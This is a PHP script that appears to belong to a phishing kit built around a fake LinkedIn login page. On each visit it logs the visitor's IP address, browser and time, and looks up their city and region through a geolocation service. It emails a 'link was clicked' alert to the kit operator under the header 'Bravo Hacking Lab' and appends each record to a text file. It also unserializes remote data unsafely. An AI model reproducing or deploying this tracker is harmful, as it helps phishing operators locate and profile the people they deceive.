<?php
   error_reporting(0);
   # ========== PHP INBUILT DEFINED OFFLINE ================= #
   $ip = getenv("REMOTE_ADDR"); # ISP BY NUMERIC #
   $port = getenv("REMOTE_PORT"); # IP PORT NUMBER #
   $adddate = date("D M d, Y g:i a"); # DAY AND TIME DETAILS #
   $browser = $_SERVER['HTTP_USER_AGENT']; # BROWSER USER INFO#
   # ============= PHP API DEFINED ONLINE =================== #
   $user_ip = getenv('REMOTE_ADDR'); # #
   $geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
   $countryIp = $geo["geoplugin_request"]; # IP BY NUMERIC #
   $portId = $geo["geoplugin_status"]; #---------------#
   $time_zone = $geo["geoplugin_timezone"]; #----------------#
   $countryName = $geo["geoplugin_countryName"]; # ISP BY NUMERIC COUNTRY-NAME #
   $city = $geo["geoplugin_city"]; # COUNTRY-NAME OF CITY #
   $region = $geo["geoplugin_regionName"]; # COUNTRY-NAME OF REGION #
   $latitude = $geo["geoplugin_latitude"];
   $longititude = $geo["geoplugin_longitude"];
   # ========================================== #
# ============= PHP API DEFINED ONLINE =================== #
$ip = getenv("REMOTE_ADDR");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");

 $user_ip = getenv('REMOTE_ADDR'); # #
 $geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
 $countryName = $geo["geoplugin_countryName"]; # ISP BY NUMERIC COUNTRY-NAME #
 $city = $geo["geoplugin_city"]; # COUNTRY-NAME OF CITY #
 $region = $geo["geoplugin_regionName"]; # COUNTRY-NAME OF REGION #
#---------------------------------------#

$seen = "| client-on-login-page : ".$countryName." | ip address : $ip | date : $date @ $dateHis | region : $region | city : $city
";

# ========= To Email ================ #
 include("Email_visitors.php");
 $subject = "[Your link was clicked From]-".$countryName."-[$ip]";
 $headers = 'Bravo Hacking Lab ';  
 @mail($to_email,$subject,$seen,$headers);

 # ========= To TXT FILE ================ #
$flogs = fopen("client-on-login-page-Linkedin.txt","a");
fwrite($flogs, $seen);
fclose($flogs);

?>
